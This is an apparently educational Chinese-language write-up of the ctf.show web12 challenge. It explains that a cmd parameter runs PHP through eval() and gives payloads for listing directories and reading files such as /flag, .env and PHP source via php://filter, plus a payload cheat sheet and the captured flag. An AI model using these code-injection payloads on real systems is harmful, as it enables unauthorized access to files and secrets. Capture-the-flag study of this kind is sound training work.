---
title: "ctf.show web12：PHP eval 代码执行与文件探测"
date: "2026-05-21"
tags: [ctf-web, php, eval, file-read, ctfshow]
source: conversation
---

## 问题背景

目标：

```text
https://4228aea0-87c2-453d-859f-adac70748afa.challenge.ctf.show/
```

页面源码提示：

```html
<!-- hit:?cmd= -->
```

题目标题：

```text
ctf.show_web12
where is the flag?
```

最开始容易误判为系统命令执行，尝试：

```text
?cmd=ls
?cmd=id
?cmd=cat /flag
```

但没有回显。后续通过：

```text
?cmd=phpinfo();
```

确认这里更像是 PHP 代码执行，而不是 shell 命令执行。

## 一句话结论

`cmd` 参数大概率进入了 PHP 的 `eval()`：

```php
eval($_GET['cmd']);
```

所以要传 PHP 语句：

```php
echo 1;
var_dump(scandir("."));
highlight_file("目标文件.php");
```

而不是传 shell 命令：

```text
ls
id
cat /flag
```

最终 flag：

```text
ctfshow{f2b049e9-8eac-4a82-bd07-b8ff00f340de}
```

## 知识点拆分

### 1. 判断执行环境：shell 命令执行 vs PHP eval

看到参数名 `cmd` 时不要只按名字判断漏洞类型。

如果后端是 shell 命令执行，可能类似：

```php
system($_GET['cmd']);
```

这时应该传：

```text
id
whoami
pwd
ls
cat /flag
```

如果后端是 PHP 代码执行，可能类似：

```php
eval($_GET['cmd']);
```

这时应该传：

```php
echo 1;
phpinfo();
var_dump(scandir("."));
```

本题中：

```text
?cmd=ls
```

没有效果，但：

```text
?cmd=phpinfo();
```

有明显回显，因此判断为 PHP 代码执行。

> [!tip]
> `cmd` 只是参数名，不代表一定能执行 Linux 命令。CTF 里经常用 `cmd` 承载 PHP 代码、模板表达式或其他解释器代码。

### 2. PHP eval payload 必须符合 PHP 语法

PHP 语句通常以分号结束。

推荐写：

```php
echo 1;
```

不要写成：

```php
echo 1
```

在 `eval()` 场景里，如果语法错误但错误显示被关闭，就会表现为“没回显”。

URL 中可以写：

```text
?cmd=echo 1;
```

更稳的 URL 编码形式：

```text
?cmd=echo%201%3B
```

含义：

```text
%20 = 空格
%3B = 分号 ;
```

### 3. PHP 字符串参数要加引号

很多 PHP 文件函数都要求路径是字符串。

正确：

```php
scandir(".");
file_get_contents("/flag");
highlight_file("index.php");
```

错误或不稳：

```php
scandir(.);
file_get_contents(/flag);
highlight_file(index.php);
```

`index.php` 不加引号时不会被当成字符串路径，而可能被 PHP 当成常量、表达式或直接触发解析错误。

### 4. URL 特殊字符编码

手工拼 payload 时，需要关注这些字符：

```text
空格 ; " ' / ? & = # + ( )
```

常见编码：

```text
空格 -> %20 或 +
;    -> %3B
"    -> %22
'    -> %27
&    -> %26
#    -> %23
+    -> %2B
```

尤其注意：

- `&` 会被当成新的参数分隔符。
- `#` 后面的内容不会发送到服务器。
- `+` 在查询参数中常被解码为空格。

例如：

```php
echo "A+B";
```

手动编码时更稳：

```text
?cmd=echo%20%22A%2BB%22%3B
```

## PHP 目录探测

### 1. 当前目录：`.`

在 PHP 里：

```php
"."
```

表示当前工作目录。

常用 payload：

```php
var_dump(scandir("."));
```

作用：列出当前目录下的文件和目录。

本题结果类似：

```php
array(4) {
  [0]=> string(1) "."
  [1]=> string(2) ".."
  [2]=> string(68) "903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php"
  [3]=> string(9) "index.php"
}
```

其中：

```text
.
```

表示当前目录。

```text
..
```

表示上级目录。

随机长文件名：

```text
903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
```

在 CTF 中非常可疑，通常是 flag 文件、源码备份或隐藏入口。

### 2. 上级目录：`..`

可以探测上级目录：

```php
var_dump(scandir(".."));
```

进一步可以探测：

```php
var_dump(scandir("../"));
var_dump(scandir("../../"));
```

用途：

- 判断 Web 根目录结构。
- 找配置文件。
- 找备份目录。
- 找部署目录。

> [!warning]
> CTF 中可以低频探测目录结构，但不要对题目站点做高并发爆破或大范围递归扫描。

### 3. 根目录：`/`

Linux 根目录：

```php
var_dump(scandir("/"));
```

本题中能看到类似：

```text
bin
dev
etc
home
proc
root
tmp
usr
var
```

这说明 PHP 进程有一定文件系统可见性，但不代表每个文件都可读。

### 4. 常见 Web 目录位置

在 PHP Web 题里，可以按需查看：

```php
var_dump(getcwd());
var_dump(__DIR__);
var_dump(scandir("/var/www/html"));
var_dump(scandir("/tmp"));
```

说明：

```php
getcwd();
```

返回当前工作目录。

```php
__DIR__
```

返回当前 PHP 文件所在目录。

如果 `eval()` 代码位于 `index.php`，两者通常都能帮助定位 Web 根目录。

### 5. 过滤目录结果

如果目录文件很多，可以用 PHP 做简单过滤。

找包含 `flag` 的文件名：

```php
foreach (scandir(".") as $f) { if (stripos($f, "flag") !== false) echo $f."\n"; }
```

找 PHP 文件：

```php
foreach (scandir(".") as $f) { if (substr($f, -4) === ".php") echo $f."\n"; }
```

递归枚举不建议在远程题目上乱跑，尤其不要大范围扫 `/`。如果确实需要，限定目录和层级。

## PHP 文件列举

### 1. `scandir()`

语法：

```php
scandir(string $directory): array|false
```

例子：

```php
var_dump(scandir("."));
```

优点：简单直接。

缺点：只列当前一层，不递归。

### 2. `glob()`

`glob()` 可以按模式匹配文件。

列出当前目录所有 PHP 文件：

```php
var_dump(glob("*.php"));
```

列出当前目录所有 txt 文件：

```php
var_dump(glob("*.txt"));
```

尝试找 flag 相关文件：

```php
var_dump(glob("*flag*"));
var_dump(glob("*FLAG*"));
```

匹配上级目录：

```php
var_dump(glob("../*.php"));
```

> [!note]
> `glob()` 是否可用受 PHP 配置和环境影响；如果没结果，不一定代表文件不存在。

### 3. `DirectoryIterator`

面向对象方式列目录：

```php
foreach (new DirectoryIterator(".") as $f) { echo $f->getFilename()."\n"; }
```

可以区分文件和目录：

```php
foreach (new DirectoryIterator(".") as $f) { echo ($f->isDir() ? "[D] " : "[F] ").$f->getFilename()."\n"; }
```

适合在 `scandir()` 被过滤时尝试。

### 4. `opendir()` / `readdir()`

较底层的目录读取方式：

```php
$h = opendir("."); while (($f = readdir($h)) !== false) { echo $f."\n"; }
```

如果 `scandir` 被禁用或过滤，可以换这种写法。

## PHP 文件读取

### 1. 读取普通文本文件：`file_get_contents()`

常见 payload：

```php
echo file_get_contents("/flag");
echo file_get_contents("/flag.txt");
echo file_get_contents("./flag.txt");
```

适合读取：

- `.txt`
- `.log`
- `.env`
- 配置文件
- 没有被 PHP 解释器执行的普通文件

如果读不到，可能原因：

- 文件不存在。
- 权限不足。
- `open_basedir` 限制。
- 函数被禁用或被题目过滤。
- 目标是 PHP 源码，直接读可能被过滤。

### 2. 读取 PHP 源码：`highlight_file()` / `show_source()`

读取 PHP 文件源码推荐：

```php
highlight_file("index.php");
show_source("index.php");
```

本题使用：

```php
highlight_file("903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php");
```

得到：

```php
<?php

$flag="ctfshow{f2b049e9-8eac-4a82-bd07-b8ff00f340de}";

?>
```

为什么不用直接访问这个 PHP 文件？

因为直接访问 `.php` 文件时，服务器会执行它；如果文件只是：

```php
$flag="xxx";
```

那么它只会赋值，不会输出。

### 3. `readfile()`

`readfile()` 会直接输出文件内容：

```php
readfile("/flag");
```

和下面效果类似：

```php
echo file_get_contents("/flag");
```

### 4. `file()`

`file()` 按行读取文件，返回数组：

```php
var_dump(file("index.php"));
```

如果直接输出不方便，可以配合：

```php
print_r(file("index.php"));
```

### 5. base64 编码读取

如果页面对特殊字符显示不友好，可以先 base64：

```php
echo base64_encode(file_get_contents("index.php"));
```

然后本地解码。

用途：

- 避免源码中的 HTML/PHP 标签被浏览器解析。
- 避免换行、特殊字符影响显示。
- 适合读取二进制或格式复杂的文件。

### 6. PHP wrapper：`php://filter`

如果存在文件包含点，常用：

```text
php://filter/read=convert.base64-encode/resource=index.php
```

在本题这种 `eval()` 直接执行 PHP 的场景，也可以用函数读取 wrapper：

```php
echo file_get_contents("php://filter/read=convert.base64-encode/resource=index.php");
```

返回的是 base64 编码后的源码。

> [!note]
> `php://filter` 在 LFI 题中尤其常用，用来读取 PHP 源码而不是执行 PHP。

## 本题复现流程

### 1. 查看源码提示

```html
<!-- hit:?cmd= -->
```

### 2. 错误方向：shell 命令

```text
?cmd=ls
?cmd=id
?cmd=cat /flag
```

无有效回显。

### 3. 正确方向：PHP 代码

```text
?cmd=phpinfo();
```

确认 PHP 代码执行。

```text
?cmd=echo 123456;
```

确认可控输出。

### 4. 目录列举

```php
var_dump(scandir("."));
```

发现：

```text
903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php
index.php
```

### 5. 源码读取

```php
highlight_file("903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php");
```

得到 flag。

## 常用 payload 速查

### 判断 PHP 代码执行

```php
echo 1;
phpinfo();
var_dump(123);
```

### 当前路径与目录

```php
echo getcwd();
echo __DIR__;
var_dump(scandir("."));
var_dump(scandir("/"));
```

### 文件列举

```php
var_dump(glob("*.php"));
var_dump(glob("*flag*"));
foreach (new DirectoryIterator(".") as $f) { echo $f->getFilename()."\n"; }
```

### 文件读取

```php
echo file_get_contents("/flag");
readfile("/flag");
print_r(file("index.php"));
highlight_file("index.php");
show_source("index.php");
echo base64_encode(file_get_contents("index.php"));
```

### PHP wrapper 读取源码

```php
echo file_get_contents("php://filter/read=convert.base64-encode/resource=index.php");
```

## 易错点清单

- 把 `eval()` 代码执行误判为 shell 命令执行。
- `echo 1` 忘记分号。
- 文件路径字符串忘记加引号。
- 直接访问 PHP 文件，误以为能看到源码。
- 只测试 `ls` / `id`，没有测试 `phpinfo();`。
- 看到无回显就认为没有执行，没有区分“执行但无输出”。
- 手动拼 URL 时没有编码 `&`、`#`、`+` 等特殊字符。
- 大范围递归扫目录，容易对题目环境造成压力。

## 待验证

- [待验证] 本题后端源码没有直接读取到，`eval($_GET['cmd'])` 是基于行为推断。
- [待验证] 不同 PHP 版本、不同 `eval()` 包裹方式下，缺少分号的表现可能不同。
- [待验证] `glob()`、`DirectoryIterator`、`php://filter` 是否可用受具体 PHP 配置影响。
